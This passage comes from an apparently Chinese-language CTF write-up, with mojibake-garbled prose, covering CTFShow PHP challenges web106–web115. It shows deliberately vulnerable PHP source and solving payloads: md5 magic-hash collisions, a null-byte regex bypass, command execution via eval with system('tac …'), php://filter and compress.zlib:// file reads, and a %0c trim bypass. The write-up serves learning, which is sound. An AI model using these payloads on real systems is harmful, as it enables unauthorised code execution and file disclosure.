</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web105.png"></p>
<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 22:38:27</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>ä¸ web104ä¸€æ ·</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web106.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web106_1.png"></p>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 23:24:14</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class="line">           echo $flag;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>parse_str() å°†å­—ç¬¦è§£ææˆå¤šä¸ªå˜é‡ã€‚</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web107.png"></p>
<ul>
<li>æ³¨æ„è¿™å¥è¯ï¼š å¦‚æœè®¾ç½®åˆ—ç¬¬äºŒä¸ªå˜é‡ resultï¼Œå˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºä»£æ›¿ã€‚è¿™ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿï¼Ÿï¼Ÿçœ‹ä¸‹å›¾</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web107_1.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºï¼šç¬¬äºŒä¸ªå‚æ•° output,ä½œä¸ºäº†ä¸‹é¢ä¸‰ä¸ªechoä¸­çš„æ•°ç»„å,è€Œç´¢å¼•ï¼šfirst, arr, arr éƒ½ä¸º ç›®æ ‡å­—ç¬¦ä¸²ä¸­çš„å†…å®¹ï¼›å› æ­¤åœ¨æœ¬é¢˜å½“ä¸­: $v2[â€˜flagâ€™] ä¸­ç´¢å¼• flag å¿…é¡»ä¸º å­—ç¬¦ä¸²v1ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥ç›®å‰ v1=flag=what what what</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>åŒæ—¶è€ƒå¯Ÿ md5() çš„å¼±æ¯”è¾ƒï¼Œå°† $v3 MD5ç¼–ç è¿‡åä¸ 1=flag=what what what æ¥æ¯”è¾ƒï¼›å› æ­¤å°±æœ‰å¦‚ä¸‹:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v3=QNKCDZO</span><br><span class="line"><span class="comment">// mdt(QNKCDZO) = 0e830400451993494058024219903391 // md5ç¼–ç ä¸º0eçš„ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”å€¼ä¸º 0 </span></span><br><span class="line">post:</span><br><span class="line">v1=flag=<span class="number">0e462097431906509019562988736854</span> <span class="comment">// md5ç¼–ç ä¸º0eçš„ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”å€¼ä¸º 0 æ­¤å¤„å¯ç®€å†™ v1=flag=0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ­¤æ—¶ 0 == 0 ä¸º True å³å¯å¾—åˆ°flag</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web107_2.png"></p>
<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p>æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 23:53:55</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><br><span class="line">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>ereg() ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒåŒ¹é…åˆ°è¿”å› TRUE,å¦åˆ™è¿”å› FALSEä½†ä¼šè¢« %00æˆªæ–­</li>
<li>strrev() å‡½æ•°ä¸ºåè½¬å­—ç¬¦ä¸²</li>
<li>intval() è·å–å˜é‡çš„æ•´æ•°å€¼</li>
<li>è¦ç»•è¿‡ç¬¬ä¸€ä¸ªif å¯ä»¥ ?c=a%00xxxxï¼Œæ­¤æ—¶ç¨‹åºåªè®¤è¯†%00å‰é¢çš„ a å°±ä¼šè¿”å›TRUE å³å¯ç»•è¿‡è¿™ä¸ªifä»è€Œä¸ä¼šç‹—å¸¦</li>
<li>ç¬¬äºŒä¸ªif() å°†ä¼ å…¥çš„å­—ç¬¦ä¸²å…ˆåè½¬å†å–æ•´æ•°å€¼: </li>
<li>0x36dä¸ºåå…­è¿›åˆ¶ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶ä¸ºï¼š 877</li>
<li>ç»¼ä¸Šæ‰€è¿°æœ‰: ?c=a%00778ï¼Œé‚£ä¹ˆ778åè½¬è¿‡æ¥ä¸º 877 , 877 == 0x36d å³å¯å¾—åˆ° flag</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web108_1.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web108.png"></p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>æºç ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-29 22:02:34</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿ å†…ç½®ç±»ğŸ‚ğŸº : Exception (PHPå¼‚å¸¸å¤„ç†)ï¼Œè¯¦æƒ…ç™¾åº¦</li>
<li>PHPå˜é‡åè·Ÿæ‹¬å·ï¼šphp å˜é‡å‡½æ•° å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHPå°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°†å°è¯•æ‰§è¡Œå®ƒã€‚</li>
<li>?v1=Exception&amp;v2=system(â€˜tac fl36dg.txtâ€™)</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web109.png"></p>
<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-29 22:49:10</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>è¿™é“é¢˜åŒæ ·è€ƒå¯Ÿ å†…ç½®ç±»çš„ç”¨æ³•ä¸”è¿‡æ»¤äº†è¿™ä¹ˆå¤šç¬¦å·</li>
<li>çœ‹äº†å¤§ä½¬çš„åšæ³•</li>
<li>?v1=FilesystemIterator&amp;v2=getcwd</li>
<li>åˆ©ç”¨äº† FilesystemIteratorç±»ä¸getcwd(è·å–å½“å‰å·¥ä½œç›®å½•) æ¥è¯»å–ç›®å½•ä¸­çš„å†…å®¹</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web110.png"></p>
<ul>
<li>å†è®¿é—®è¿™ä¸ªæ–‡ä»¶</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web110_1.png"></p>
<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-30 02:41:40</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå®šä¹‰äº†ä¸€ä¸ªå‡½æ•° getFlag()æœ‰ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯&amp;$v1,&amp;$v2, å…¶ä¸­eval(â€œ$$v1 = &amp;$$v2;â€); è¡¨ç¤º $$v1=($$v2çš„<strong>åœ°å€</strong>)=$v2;</li>
<li>å…¶æ¬¡ä»ç„¶å¯¹$v1,$v2è¿‡æ»¤äº†å¾ˆå¤šå†…å®¹</li>
<li>ç„¶åå¯¹$v1è¿›è¡ŒåŒ¹é…ä¸º ctfshowæ‰èƒ½æ‰§è¡Œå®ƒçš„åˆ†æ”¯ï¼Œæ‰èƒ½è°ƒç”¨ä¸Šé¢å®šä¹‰çš„å‡½æ•°ï¼›é‚£ä¹ˆ$v1=ctfshow, $$v1=$ctfshow, $ctfshow=$v2; è¿™æ—¶ç¬¬ä¸€ä¸ªå‚æ•° $v1=ctfshow,å‡ºæ¥äº†ï¼Œç¬¬äºŒä¸ªå‚æ•°å¯ä»¥åˆ©ç”¨ï¼š GLOBALS</li>
<li>å› æ­¤: ?v1=ctfshow&amp;v2=GLOBALS</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web111.png"></p>
<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p>æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-30 23:47:49</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œè‡ªå®šä¹‰äº†ä¸€ä¸ªå‡½æ•° filter() åŠŸèƒ½æ˜¯å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒåŒ¹é…è¿‡æ»¤</li>
<li>ç„¶å is_file() å‡½æ•°çš„åŠŸèƒ½æ˜¯ï¼šåˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ï¼Œæ³¨æ„ !(é)æ“ä½œï¼Œè¦ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶è·¯å¾„æ‰ä¼šæ‰§è¡Œå®ƒçš„åˆ†æ”¯</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web112.png"></p>
<ul>
<li>è¿™é“é¢˜è¿‡æ»¤äº† input, rot13, base64 ä½†æ˜¯è¿˜æœ‰è®¸å¤šä¼ªåè®®ï¼Œç¼–ç æ–¹å¼æ²¡æœ‰è¿‡æ»¤ğŸ‚ğŸº:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web112_1.png"></p>
<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-30 23:47:52</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå‘ç°åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¯¹  filterè¿›è¡Œäº†åŒ¹é…ï¼Œé‚£æ²¡äº‹æ²¡æœ‰å¯¹ compress.zlib://è¿›è¡Œè¿‡æ»¤</li>
<li>compress.zlib://flag.php</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web113.png"></p>
<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-10-01 15:02:53</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;;</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå‘ç°å¯¹ compressè¿›è¡Œäº†åŒ¹é…ï¼Œä½†å´å¯¹ filter çš„åŒ¹é…å–æ¶ˆäº†</li>
<li>?file=php://filter/resource=flag.php</li>
<li>ğŸ˜•</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web114.png"></p>
<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå®šä¹‰äº†ä¸€ä¸ªå‡½æ•° filter() è¿‡æ»¤äº†ä¸€äº›å†…å®¹ã€‚</li>
<li>is_numeric() åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ã€‚</li>
<li><strong>trim()</strong> ç§»é™¤å­—ç¬¦ä¸²é¦–å°¾çš„ç©ºç™½å­—ç¬¦(æˆ–è€…å…¶ä»–å­—ç¬¦) <strong>é‡ç‚¹ï¼Œå¤§å‘ã€‚</strong></li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web115.png"></p>
<ul>
<li><p>æ³¨æ„å›¾ä¸­ trim() ä¼šå»é™¤çš„å­—ç¬¦æœ‰: \nâ€ (ASCII 10 (0x0A))ï¼Œæ¢è¡Œç¬¦, \x0Bâ€ (ASCII 11 (0x0B))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ â€œ\râ€ (ASCII 13 (0x0D))ï¼Œå›è½¦ç¬¦ã€‚  æœ‰ 0A, 0B, 0D å”¯ç‹¬æ²¡æœ‰ 0c ï¼Œ 0x0c ä¸ºåˆ†é¡µç¬¦ã€‚è¿™æ„æ€å°±æ˜¯ trim() å¯¹ å­—ç¬¦ä¸²é¦–å°¾æœ‰ 0x0cçš„å­—ç¬¦ä¸èµ·ä½œç”¨ï¼Œè¿™â„¢è°çŸ¥é“æœ‰è¿™èŒ¬å•Šã€‚</p>
</li>
<li><p>!==: ä¸å…¨ç­‰ï¼Œä¼šæ¯”è¾ƒç±»å‹å’Œå€¼ï¼Œ == å¼±ç±»å‹æ¯”è¾ƒï¼Œåªæ¯”è¾ƒæ•°å€¼, æ³¨æ„è¿™ç‚¹ï¼Œé‚£ä¹ˆ $num!==â€™36â€™ ä¸ $num==â€™36â€™ å°†ä¸ä¼šçŸ›ç›¾ï¼Œå› æ­¤ ç¬¬ä¸€ä¸ª if æ‰ä¸ºTrue æ‰èƒ½ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p>
</li>
<li><p>?num=%0c36</p>
</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web115_1.png"></p>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p>æºç :</p>
